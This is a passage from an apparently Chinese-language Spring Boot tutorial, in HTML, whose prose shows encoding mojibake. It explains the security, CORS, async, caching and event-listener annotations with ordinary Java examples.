 Â  <span class="hljs-comment">// æ”¯æŒROLE_USERæˆ–ROLE_ADMINè§’è‰²</span>
 Â  <span class="hljs-meta">@RolesAllowed({"USER", "ADMIN"})</span>
 Â  <span class="hljs-keyword">public</span> List&lt;ProductDTO&gt; <span class="hljs-title function_">getProductList</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> productMapper.selectAll();
 Â  }
}
</code></pre>
<h3 data-id="heading-52">4. @AuthenticationPrincipal</h3>
<p><code>@AuthenticationPrincipal</code> ç”¨äºè·å–å½“å‰ç™»å½•ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ï¼ˆ<code>Authentication</code>ä¸­çš„<code>Principal</code>ï¼‰ï¼Œç®€åŒ–ç”¨æˆ·ä¿¡æ¯è·å–ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
 Â  <span class="hljs-comment">// è·å–å½“å‰ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åï¼ˆPrincipalä¸ºStringç±»å‹ï¼‰</span>
 Â  <span class="hljs-meta">@GetMapping("/info")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;UserInfo&gt; <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">(<span class="hljs-meta">@AuthenticationPrincipal</span> String username)</span> {
 Â  Â  Â  <span class="hljs-type">UserInfo</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> userService.getUserByUsername(username);
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(userInfo);
 Â  }
 Â  <span class="hljs-comment">// è·å–è‡ªå®šä¹‰UserDetailså¯¹è±¡ï¼ˆéœ€å®ç°UserDetailsæ¥å£ï¼‰</span>
 Â  <span class="hljs-meta">@GetMapping("/profile")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;CustomUserDetails&gt; <span class="hljs-title function_">getProfile</span><span class="hljs-params">(<span class="hljs-meta">@AuthenticationPrincipal</span> CustomUserDetails userDetails)</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(userDetails);
 Â  }
}
</code></pre>
<h3 data-id="heading-53">5. @CrossOrigin</h3>
<p><code>@CrossOrigin</code> ç”¨äºè§£å†³è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰é—®é¢˜ï¼Œæ ‡æ³¨åœ¨ Controller æˆ–æ–¹æ³•ä¸Šï¼Œå…è®¸è·¨åŸŸè¯·æ±‚è®¿é—®ã€‚</p>
<ul>
<li>æ ¸å¿ƒåœºæ™¯ï¼šå‰åç«¯åˆ†ç¦»æ¶æ„ä¸­ï¼Œå‰ç«¯åŸŸåä¸åç«¯ API åŸŸåä¸ä¸€è‡´æ—¶é…ç½®ï¼›</li>
<li>åº•å±‚åŸç†ï¼šè‡ªåŠ¨æ·»åŠ <code>Access-Control-*</code>å“åº”å¤´ï¼Œæ”¯æŒé¢„æ£€è¯·æ±‚ï¼ˆOPTIONSï¼‰ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>








































<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>origins</td><td>å…è®¸çš„è·¨åŸŸæº</td><td>æ•°ç»„å½¢å¼ï¼Œå¦‚<code>origins = {"``https://example.com``", "``http://localhost:8080``"}</code>ï¼Œ<code>*</code>è¡¨ç¤ºå…è®¸æ‰€æœ‰ï¼ˆä¸æ¨èç”Ÿäº§ç¯å¢ƒï¼‰</td></tr><tr><td>allowedHeaders</td><td>å…è®¸çš„è¯·æ±‚å¤´</td><td>æ•°ç»„å½¢å¼ï¼Œå¦‚<code>allowedHeaders = {"Content-Type", "Authorization"}</code>ï¼Œ<code>*</code>è¡¨ç¤ºå…è®¸æ‰€æœ‰</td></tr><tr><td>methods</td><td>å…è®¸çš„è¯·æ±‚æ–¹æ³•</td><td>æ•°ç»„å½¢å¼ï¼Œå¦‚<code>methods = {RequestMethod.GET, RequestMethod.POST}</code>ï¼Œé»˜è®¤å…è®¸æ‰€æœ‰è¯·æ±‚æ–¹æ³•</td></tr><tr><td>exposedHeaders</td><td>å…è®¸å‰ç«¯è®¿é—®çš„å“åº”å¤´</td><td>æ•°ç»„å½¢å¼ï¼Œå¦‚<code>exposedHeaders = "X-Total-Count"</code>ï¼Œé»˜è®¤ä»…æš´éœ²åŸºæœ¬å“åº”å¤´</td></tr><tr><td>allowCredentials</td><td>æ˜¯å¦å…è®¸æºå¸¦ Cookie</td><td>â‘  <code>true</code>ï¼šå…è®¸ï¼ˆéœ€å‰ç«¯é…åˆè®¾ç½®<code>withCredentials: true</code>ï¼‰ï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä¸å…è®¸</td></tr><tr><td>maxAge</td><td>é¢„æ£€è¯·æ±‚ç¼“å­˜æ—¶é—´ï¼ˆç§’ï¼‰</td><td>é»˜è®¤ä¸º 1800 ç§’ï¼ˆ30 åˆ†é’Ÿï¼‰ï¼Œå‡å°‘é¢„æ£€è¯·æ±‚æ¬¡æ•°</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç±»çº§é…ç½®ï¼šæ‰€æœ‰æ–¹æ³•å…è®¸è·¨åŸŸ</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api")</span>
<span class="hljs-meta">@CrossOrigin(
 Â  origins = {"https://example.com", "http://localhost:8080"},
 Â  allowedHeaders = "*",
 Â  allowCredentials = true,
 Â  maxAge = 3600
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiController</span> {
 Â  <span class="hljs-comment">// æ–¹æ³•çº§é…ç½®ï¼šè¦†ç›–ç±»çº§ï¼Œä»…å…è®¸GET/POSTæ–¹æ³•</span>
 Â  <span class="hljs-meta">@CrossOrigin(methods = {RequestMethod.GET, RequestMethod.POST})</span>
 Â  <span class="hljs-meta">@GetMapping("/data")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;List&lt;DataDTO&gt;&gt; <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(dataService.list());
 Â  }
}
</code></pre>
<h2 data-id="heading-54">å…­ã€å…¶ä»–å¸¸ç”¨æ ¸å¿ƒæ³¨è§£</h2>
<h3 data-id="heading-55">1. å¼‚æ­¥ç›¸å…³æ³¨è§£</h3>
<h4 data-id="heading-56">ï¼ˆ1ï¼‰@EnableAsync</h4>
<p><code>@EnableAsync</code> ç”¨äºå¯ç”¨ Spring å¼‚æ­¥æ–¹æ³•æ”¯æŒï¼Œæ ‡æ³¨åœ¨é…ç½®ç±»ä¸Šã€‚</p>
<ul>
<li>æ ¸å¿ƒä½œç”¨ï¼šæ¿€æ´» Spring å¯¹<code>@Async</code>æ³¨è§£çš„è¯†åˆ«ï¼Œé€šè¿‡çº¿ç¨‹æ± æ‰§è¡Œå¼‚æ­¥æ–¹æ³•ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>proxyTargetClass</td><td>æ˜¯å¦ä½¿ç”¨ CGLIB ä»£ç†</td><td>â‘  <code>true</code>ï¼šç±»ä»£ç†ï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šæ¥å£ä»£ç†</td></tr><tr><td>mode</td><td>ä»£ç†æ¨¡å¼</td><td><code>PROXY</code>ï¼ˆé»˜è®¤ï¼‰æˆ–<code>ASPECTJ</code>ï¼ˆéœ€é¢å¤–ä¾èµ–ï¼‰</td></tr><tr><td>order</td><td>å¼‚æ­¥åˆ‡é¢ä¼˜å…ˆçº§</td><td>æ•°å€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼Œé»˜è®¤æœ€ä½</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableAsync(proxyTargetClass = true)</span> <span class="hljs-comment">// å¯ç”¨å¼‚æ­¥æ”¯æŒ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncConfig</span> {
 Â  <span class="hljs-comment">// é…ç½®è‡ªå®šä¹‰çº¿ç¨‹æ± ï¼ˆæ¨èï¼‰</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">taskExecutor</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();
 Â  Â  Â  executor.setCorePoolSize(<span class="hljs-number">5</span>); <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•°</span>
 Â  Â  Â  executor.setMaxPoolSize(<span class="hljs-number">10</span>); <span class="hljs-comment">// æœ€å¤§çº¿ç¨‹æ•°</span>
 Â  Â  Â  executor.setQueueCapacity(<span class="hljs-number">20</span>); <span class="hljs-comment">// é˜Ÿåˆ—å®¹é‡</span>
 Â  Â  Â  executor.setKeepAliveSeconds(<span class="hljs-number">60</span>); <span class="hljs-comment">// ç©ºé—²çº¿ç¨‹å­˜æ´»æ—¶é—´</span>
 Â  Â  Â  executor.setThreadNamePrefix(<span class="hljs-string">"Async-"</span>); <span class="hljs-comment">// çº¿ç¨‹åå‰ç¼€</span>
 Â  Â  Â  executor.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()); <span class="hljs-comment">// æ‹’ç»ç­–ç•¥</span>
 Â  Â  Â  executor.initialize();
 Â  Â  Â  <span class="hljs-keyword">return</span> executor;
 Â  }
}
</code></pre>
<h4 data-id="heading-57">ï¼ˆ2ï¼‰@Async</h4>
<p><code>@Async</code> æ ‡æ³¨æ–¹æ³•ä¸ºå¼‚æ­¥æ–¹æ³•ï¼ŒSpring ä¼šé€šè¿‡çº¿ç¨‹æ± å¼‚æ­¥æ‰§è¡Œï¼ˆéå½“å‰çº¿ç¨‹é˜»å¡ï¼‰ã€‚</p>
<ul>
<li>å¼‚æ­¥æ–¹æ³•ä¸èƒ½åœ¨åŒä¸€ä¸ªç±»ä¸­è°ƒç”¨ï¼ˆä»£ç†å¤±æ•ˆï¼Œå¦‚äº‹åŠ¡å¤±æ•ˆï¼‰ï¼›</li>
<li>æ— è¿”å›å€¼ç”¨<code>void</code>ï¼Œæœ‰è¿”å›å€¼ç”¨<code>Future&lt;T&gt;</code>æˆ–<code>CompletableFuture&lt;T&gt;</code>ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncService</span> {
 Â  <span class="hljs-comment">// æ— è¿”å›å€¼å¼‚æ­¥æ–¹æ³•</span>
 Â  <span class="hljs-meta">@Async("taskExecutor")</span> <span class="hljs-comment">// æŒ‡å®šçº¿ç¨‹æ± ï¼ˆå¯¹åº”AsyncConfigä¸­çš„Beanåç§°ï¼‰</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendNotice</span><span class="hljs-params">(Long userId, String content)</span> {
 Â  Â  Â  <span class="hljs-comment">// å¼‚æ­¥æ‰§è¡Œï¼šå‘é€çŸ­ä¿¡/é‚®ä»¶é€šçŸ¥ï¼ˆæ— è¿”å›å€¼ï¼‰</span>
 Â  Â  Â  noticeClient.send(userId, content);
 Â  }
 Â  <span class="hljs-comment">// æœ‰è¿”å›å€¼å¼‚æ­¥æ–¹æ³•ï¼ˆCompletableFutureæ”¯æŒé“¾å¼è°ƒç”¨ï¼‰</span>
 Â  <span class="hljs-meta">@Async</span>
 Â  <span class="hljs-keyword">public</span> CompletableFuture&lt;Boolean&gt; <span class="hljs-title function_">exportData</span><span class="hljs-params">(String condition)</span> {
 Â  Â  Â  <span class="hljs-comment">// å¼‚æ­¥æ‰§è¡Œï¼šæ•°æ®å¯¼å‡ºé€»è¾‘</span>
 Â  Â  Â  <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> exportService.doExport(condition);
 Â  Â  Â  <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(success);
 Â  }
}
<span class="hljs-comment">// è°ƒç”¨ç¤ºä¾‹</span>
<span class="hljs-meta">@Controller</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExportController</span> {
 Â  <span class="hljs-meta">@Autowired</span>
 Â  <span class="hljs-keyword">private</span> AsyncService asyncService;
 Â  <span class="hljs-meta">@GetMapping("/export")</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">export</span><span class="hljs-params">(String condition)</span> {
 Â  Â  Â  CompletableFuture&lt;Boolean&gt; future = asyncService.exportData(condition);
 Â  Â  Â  future.whenComplete((success, ex) -&gt; {
 Â  Â  Â  Â  Â  <span class="hljs-keyword">if</span> (success) {
 Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// å¯¼å‡ºæˆåŠŸå›è°ƒ</span>
 Â  Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
 Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// å¯¼å‡ºå¤±è´¥å¤„ç†</span>
 Â  Â  Â  Â  Â  }
 Â  Â  Â  });
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"å¯¼å‡ºä»»åŠ¡å·²å¯åŠ¨ï¼Œè¯·ç¨åæŸ¥çœ‹ç»“æœ"</span>);
 Â  }
}
</code></pre>
<h3 data-id="heading-58">2. ç¼“å­˜ç›¸å…³æ³¨è§£</h3>
<h4 data-id="heading-59">ï¼ˆ1ï¼‰@EnableCaching</h4>
<p><code>@EnableCaching</code> ç”¨äºå¯ç”¨ Spring ç¼“å­˜æ”¯æŒï¼Œæ ‡æ³¨åœ¨é…ç½®ç±»ä¸Šã€‚</p>
<ul>
<li>æ ¸å¿ƒä½œç”¨ï¼šæ¿€æ´» Spring å¯¹ç¼“å­˜æ³¨è§£ï¼ˆ<code>@Cacheable</code>ã€<code>@CachePut</code>ç­‰ï¼‰çš„è¯†åˆ«ï¼Œæ•´åˆç¬¬ä¸‰æ–¹ç¼“å­˜ï¼ˆå¦‚ Redisã€Caffeineï¼‰ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableCaching</span> <span class="hljs-comment">// å¯ç”¨ç¼“å­˜æ”¯æŒ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheConfig</span> {
 Â  <span class="hljs-comment">// é…ç½®Redisç¼“å­˜ç®¡ç†å™¨ï¼ˆéœ€å¼•å…¥spring-boot-starter-data-redisä¾èµ–ï¼‰</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> RedisCacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">(RedisConnectionFactory connectionFactory)</span> {
 Â  Â  Â  <span class="hljs-type">RedisCacheConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> RedisCacheConfiguration.defaultCacheConfig()
 Â  Â  Â  Â  Â  Â  Â  .entryTtl(Duration.ofMinutes(<span class="hljs-number">30</span>)) <span class="hljs-comment">// é»˜è®¤ç¼“å­˜è¿‡æœŸæ—¶é—´30åˆ†é’Ÿ</span>
 Â  Â  Â  Â  Â  Â  Â  .serializeKeysWith(RedisSerializationContext.SerializationPair
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .fromSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>()))
 Â  Â  Â  Â  Â  Â  Â  .serializeValuesWith(RedisSerializationContext.SerializationPair
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .fromSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>()));
 Â  Â  Â  <span class="hljs-comment">// è‡ªå®šä¹‰ä¸åŒç¼“å­˜çš„è¿‡æœŸæ—¶é—´</span>
 Â  Â  Â  Map&lt;String, RedisCacheConfiguration&gt; cacheConfigs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
 Â  Â  Â  cacheConfigs.put(<span class="hljs-string">"userCache"</span>, config.entryTtl(Duration.ofHours(<span class="hljs-number">1</span>)));
 Â  Â  Â  cacheConfigs.put(<span class="hljs-string">"productCache"</span>, config.entryTtl(Duration.ofMinutes(<span class="hljs-number">10</span>)));
 Â  Â  Â  <span class="hljs-keyword">return</span> RedisCacheManager.builder(connectionFactory)
 Â  Â  Â  Â  Â  Â  Â  .cacheDefaults(config)
 Â  Â  Â  Â  Â  Â  Â  .withInitialCacheConfigurations(cacheConfigs)
 Â  Â  Â  Â  Â  Â  Â  .build();
 Â  }
}
</code></pre>
<h4 data-id="heading-60">ï¼ˆ2ï¼‰æ ¸å¿ƒç¼“å­˜æ³¨è§£</h4>



































<table><thead><tr><th>æ³¨è§£ Â  Â  Â  Â  Â  Â </th><th>ä½œç”¨ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â </th><th>æ ¸å¿ƒå±æ€§ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â </th></tr></thead><tbody><tr><td><code>@Cacheable</code> Â </td><td>æŸ¥è¯¢ç¼“å­˜ï¼šå­˜åœ¨åˆ™è¿”å›ç¼“å­˜ï¼Œä¸å­˜åœ¨åˆ™æ‰§è¡Œæ–¹æ³•å¹¶ç¼“å­˜ç»“æœ Â  Â  Â </td><td><code>value</code>ï¼ˆç¼“å­˜åç§°ï¼‰ã€<code>key</code>ï¼ˆç¼“å­˜é”®ï¼ŒSpEL è¡¨è¾¾å¼ï¼‰ã€<code>condition</code>ï¼ˆç¼“å­˜æ¡ä»¶ï¼‰ Â  Â  Â  Â  Â  Â  Â </td></tr><tr><td><code>@CachePut</code> Â  Â </td><td>æ›´æ–°ç¼“å­˜ï¼šæ‰§è¡Œæ–¹æ³•åæ›´æ–°ç¼“å­˜ï¼ˆä¸æŸ¥è¯¢ç¼“å­˜ï¼‰ Â  Â  Â  Â  Â </td><td>åŒ<code>@Cacheable</code>ï¼Œç”¨äºæ–°å¢ / ä¿®æ”¹æ“ä½œ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â </td></tr><tr><td><code>@CacheEvict</code> Â </td><td>åˆ é™¤ç¼“å­˜ï¼šæ‰§è¡Œæ–¹æ³•ååˆ é™¤æŒ‡å®šç¼“å­˜ Â  Â  Â  Â  Â  Â  Â  Â </td><td>åŒ<code>@Cacheable</code>ï¼Œ<code>allEntries</code>ï¼ˆæ˜¯å¦åˆ é™¤æ‰€æœ‰ç¼“å­˜ï¼‰ã€<code>beforeInvocation</code>ï¼ˆæ˜¯å¦æ‰§è¡Œå‰åˆ é™¤ï¼‰</td></tr><tr><td><code>@Caching</code> Â  Â </td><td>ç»„åˆç¼“å­˜ï¼šä¸€ä¸ªæ–¹æ³•é…ç½®å¤šä¸ªç¼“å­˜æ³¨è§£ Â  Â  Â  Â  Â  Â  Â </td><td><code>cacheable</code>ã€<code>put</code>ã€<code>evict</code>ï¼ˆæ•°ç»„å½¢å¼ï¼‰ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â </td></tr><tr><td><code>@CacheConfig</code></td><td>ç±»çº§ç¼“å­˜é…ç½®ï¼šç»Ÿä¸€æŒ‡å®š<code>value</code>ï¼ˆç¼“å­˜åç§°ï¼‰ï¼Œæ–¹æ³•çº§å¯è¦†ç›–</td><td><code>value</code>ï¼ˆé»˜è®¤ç¼“å­˜åç§°ï¼‰ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â </td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@CacheConfig(value = "productCache")</span> <span class="hljs-comment">// ç±»çº§ï¼šé»˜è®¤ç¼“å­˜åç§°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
 Â  <span class="hljs-comment">// æŸ¥è¯¢ç¼“å­˜ï¼škeyä¸ºäº§å“IDï¼Œæ¡ä»¶ä¸ºID&gt;0</span>
 Â  <span class="hljs-meta">@Cacheable(key = "#id", condition = "#id &gt; 0")</span>
 Â  <span class="hljs-keyword">public</span> ProductDTO <span class="hljs-title function_">getProductById</span><span class="hljs-params">(Long id)</span> {
 Â  Â  Â  <span class="hljs-comment">// ç¼“å­˜ä¸å­˜åœ¨æ—¶æ‰§è¡Œï¼šæŸ¥è¯¢æ•°æ®åº“</span>
 Â  Â  Â  <span class="hljs-keyword">return</span> productMapper.selectById(id);
 Â  }
 Â  <span class="hljs-comment">// æ›´æ–°ç¼“å­˜ï¼šæ–°å¢äº§å“åç¼“å­˜ç»“æœï¼ˆkeyä¸ºè¿”å›çš„IDï¼‰</span>
 Â  <span class="hljs-meta">@CachePut(key = "#result.id")</span>
 Â  <span class="hljs-keyword">public</span> ProductDTO <span class="hljs-title function_">addProduct</span><span class="hljs-params">(ProductForm form)</span> {
 Â  Â  Â  <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
 Â  Â  Â  BeanUtils.copyProperties(form, product);
 Â  Â  Â  productMapper.insert(product);
 Â  Â  Â  <span class="hljs-type">ProductDTO</span> <span class="hljs-variable">dto</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductDTO</span>();
 Â  Â  Â  BeanUtils.copyProperties(product, dto);
 Â  Â  Â  <span class="hljs-keyword">return</span> dto;
 Â  }
 Â  <span class="hljs-comment">// åˆ é™¤ç¼“å­˜ï¼šåˆ é™¤äº§å“ååˆ é™¤å¯¹åº”ç¼“å­˜ï¼ŒåŒæ—¶æ¸…ç©ºæ‰€æœ‰äº§å“åˆ—è¡¨ç¼“å­˜</span>
 Â  <span class="hljs-meta">@Caching(evict = {
 Â  Â  Â  @CacheEvict(key = "#id"), // åˆ é™¤å•ä¸ªäº§å“ç¼“å­˜
 Â  Â  Â  @CacheEvict(value = "productListCache", allEntries = true) // æ¸…ç©ºåˆ—è¡¨ç¼“å­˜
 Â  })</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long id)</span> {
 Â  Â  Â  productMapper.deleteById(id);
 Â  }
 Â  <span class="hljs-comment">// æ¡ä»¶ç¼“å­˜ï¼šæŸ¥è¯¢åˆ—è¡¨æ—¶ç¼“å­˜ï¼Œæ¡ä»¶ä¸ºåˆ†ç±»IDä¸ä¸ºç©º</span>
 Â  <span class="hljs-meta">@Cacheable(value = "productListCache", key = "#categoryId", condition = "#categoryId != null")</span>
 Â  <span class="hljs-keyword">public</span> List&lt;ProductDTO&gt; <span class="hljs-title function_">getProductByCategoryId</span><span class="hljs-params">(Long categoryId)</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> productMapper.selectByCategoryId(categoryId);
 Â  }
}
</code></pre>
<h3 data-id="heading-61">3. äº‹ä»¶ç›¸å…³æ³¨è§£</h3>
<h4 data-id="heading-62">ï¼ˆ1ï¼‰@EventListener</h4>
<p><code>@EventListener</code> æ ‡æ³¨æ–¹æ³•ä¸º Spring äº‹ä»¶ç›‘å¬å™¨ï¼Œç›‘å¬æŒ‡å®šç±»å‹çš„äº‹ä»¶ã€‚</p>
<ul>
<li>æ ¸å¿ƒåœºæ™¯ï¼šè§£è€¦ä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚è®¢å•åˆ›å»ºåè§¦å‘åº“å­˜æ‰£å‡ã€æ—¥å¿—è®°å½•ç­‰ï¼‰ï¼›</li>
<li>æ”¯æŒäº‹ä»¶ï¼šSpring å†…ç½®äº‹ä»¶ï¼ˆå¦‚<code>ContextRefreshedEvent</code>ï¼‰æˆ–è‡ªå®šä¹‰äº‹ä»¶ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å®šä¹‰è‡ªå®šä¹‰äº‹ä»¶ï¼ˆç»§æ‰¿ApplicationEventï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ApplicationEvent</span> {
 Â  <span class="hljs-keyword">private</span> OrderDTO orderDTO;
 Â  <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderCreatedEvent</span><span class="hljs-params">(Object source, OrderDTO orderDTO)</span> {
 Â  Â  Â  <span class="hljs-built_in">super</span>(source);
 Â  Â  Â  <span class="hljs-built_in">this</span>.orderDTO = orderDTO;
 Â  }
 Â  <span class="hljs-comment">// getter/setter</span>
}
<span class="hljs-comment">// 2. å‘å¸ƒäº‹ä»¶ï¼ˆåœ¨ä¸šåŠ¡æ–¹æ³•ä¸­ï¼‰</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
 Â  <span class="hljs-meta">@Autowired</span>
 Â  <span class="hljs-keyword">private</span> ApplicationEventPublisher eventPublisher;
 Â  <span class="hljs-meta">@Transactional</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderDTO orderDTO)</span> {
 Â  Â  Â  <span class="hljs-comment">// è®¢å•åˆ›å»ºé€»è¾‘</span>
 Â  Â  Â  orderMapper.insert(orderDTO);
 Â  Â  Â  <span class="hljs-comment">// å‘å¸ƒäº‹ä»¶ï¼ˆå¼‚æ­¥å‘å¸ƒéœ€é…åˆ@Asyncï¼‰</span>
 Â  Â  Â  eventPublisher.publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>(<span class="hljs-built_in">this</span>, orderDTO));
 Â  }
}
<span class="hljs-comment">// 3. ç›‘å¬äº‹ä»¶ï¼ˆå¤šä¸ªç›‘å¬å™¨å¯åŒæ—¶ç›‘å¬ï¼‰</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {
 Â  <span class="hljs-comment">// åŒæ­¥ç›‘å¬ï¼šä¸å‘å¸ƒäº‹ä»¶çš„äº‹åŠ¡åŒçº¿ç¨‹</span>
 Â  <span class="hljs-meta">@EventListener(OrderCreatedEvent.class)</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreated</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
 Â  Â  Â  <span class="hljs-type">OrderDTO</span> <span class="hljs-variable">orderDTO</span> <span class="hljs-operator">=</span> event.getOrderDTO();
 Â  Â  Â  <span class="hljs-comment">// æ‰§è¡Œåç»­é€»è¾‘ï¼šå¦‚æ—¥å¿—è®°å½•</span>
 Â  Â  Â  logService.recordOrderLog(orderDTO.getId(), <span class="hljs-string">"è®¢å•åˆ›å»ºæˆåŠŸ"</span>);
 Â  }
 Â  <span class="hljs-comment">// å¼‚æ­¥ç›‘å¬ï¼šé€šè¿‡@AsyncæŒ‡å®šçº¿ç¨‹æ± ï¼Œä¸é˜»å¡ä¸»çº¿ç¨‹</span>
 Â  <span class="hljs-meta">@Async("taskExecutor")</span>
 Â  <span class="hljs-meta">@EventListener(OrderCreatedEvent.class)</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleInventoryDeduct</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
 Â  Â  Â  <span class="hljs-type">OrderDTO</span> <span class="hljs-variable">orderDTO</span> <span class="hljs-operator">=</span> event.getOrderDTO();
 Â  Â  Â  <span class="hljs-comment">// å¼‚æ­¥æ‰§è¡Œï¼šåº“å­˜æ‰£å‡</span>
 Â  Â  Â  inventoryService.deduct(orderDTO.getProductId(), orderDTO.getQuantity());
 Â  }
}
</code></pre>
<h4 data-id="heading-63">ï¼ˆ2ï¼‰@TransactionalEventListener</h4>
